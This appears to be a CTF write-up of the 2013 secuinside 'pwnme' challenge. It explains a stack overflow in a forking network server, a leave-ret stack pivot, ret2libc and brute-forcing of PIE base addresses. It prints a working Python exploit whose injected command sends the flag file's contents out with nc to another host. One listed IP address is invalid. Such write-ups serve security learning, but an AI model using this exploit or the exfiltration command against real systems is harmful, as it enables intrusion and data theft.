---
title: secuinside CTF 2013 quals pwnme writeup
author: kelwin
layout: post
permalink: /secuinside-ctf-2013-quals-pwnme-writeup/
categories:
  - Uncategorized
---
PIE is turned on when compilling pwnme. Position-Independent-Executable is a feature of GCC that allows the executable to behave like a shared library so base addresses can be relocatable.

The major part of the source of pwnme is as below:

    #define MYPORT 8181 
    #define BUFSIZE 1024 
    
    void main(void)
    {
        char buf[BUFSIZE];
        ……    
        if (!fork()) { 
            send(client_fd, "what is your name? ", 19, 0);
    
            memset(buf, 0, sizeof(buf));
            recv(client_fd, buf, BUFSIZE+16, 0);
            send(client_fd, "nice to meet you!\n", 18, 0);
    
            printf("DEBUG : %s was here\n", buf);
            memset(buf, 0, sizeof(buf));
            close(client_fd);
            return 0;
        } else {
            close(client_fd);  
            while(waitpid(-1, NULL, WNOHANG) > 0); 
        }
    }
    

Obviously, it contains a basic stack overflow bug and we can only overwrite return address of `main` function. What&#8217;s worse, the first BUFSIZE bytes of buffer is set to 0 before return of `main`. However, a call of `printf` moves the input buffer to the stdout buffer. We can use a `leave ret` gadget to migrate the stack to the stdout buffer. So suppose we know base address, we can figure out the address of stdout buffer and perform a ret2libc attack using `system` function.

Pwnme forks a child process for each connection, so the base address will be the same with the parent process. Luckily, randomization on x86 Ubuntu is only 9-bits. We can perform a brute-force attack on the base address.

Our exploit code is as follows:

    import sys
    import struct
    import socket
    
    HOST = "54.214.258.68"
    HOST = "172.16.0.142"
    PORT = 8181
    
    def p(addr):
        return struct.pack("<I", addr)
    
    def exploit(base, host, port):
        print hex(base)
        leaveret = p(base + 0xe2953)
        ret = p(base + 0xe2954)
        ebp = p(base + 0x1b7034)
        cmd = '(ls;pwd;cat key) | nc 172.16.0.1 12345'
        cmd_addr = p(base + 0x1b738d)
        system = p(base + 0x41280)
        buf = 180 * ret + system + "AAAA" + cmd_addr + ' ' * (1040 - 180 * 4 - 12 - 1 - 40 - 8 - len(cmd)) + cmd + ';' + 'B' * 40 + ebp + leaveret
    
        try :
            s = socket.socket()
            s.connect((host, port))
            s.settimeout(3)
            s.recv(1024)
            s.send(buf)
            s.close()
            return True
        except socket.error:
            print "socket error!"
            return False
        else:
            sys.exit(1)
    
    # base = 0xb7e23000
    # exploit(base, HOST, PORT)
    
    bases = range(0xb7500000, 0xb76ff000, 0x1000)
    i = 0
    while i < len(bases):
        if exploit(bases[i], HOST, PORT):
            i += 1